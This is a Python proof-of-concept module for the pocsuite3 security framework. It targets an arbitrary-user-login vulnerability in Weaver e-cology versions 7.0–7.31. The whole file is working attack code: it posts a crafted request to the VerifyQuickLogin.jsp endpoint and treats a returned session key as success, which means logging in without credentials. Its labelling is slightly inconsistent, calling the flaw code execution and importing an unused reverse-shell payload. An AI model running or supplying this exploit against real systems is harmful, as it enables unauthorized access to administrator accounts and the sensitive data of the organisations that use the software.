from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 e-cology 存在任意用户登录漏洞'
    appName = '泛微 e-cology'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司 e-cology 存在任意管理⽤户登陆漏洞,攻击者可利用该漏洞获取系统敏感信息等。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        s = requests.session()
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
            'Content-Type':'application/x-www-form-urlencoded'
        }
        path='/mobile/plugin/VerifyQuickLogin.jsp'
        data='identifier=1&language=1&ipaddress=1.1.1.1'
        vulur = self.url+path
        resp = s.post(vulur,headers=headers,verify=False,allow_redirects=False,data=data,timeout=10)
        if resp.status_code == 200 and '"sessionkey":"' in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulur
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
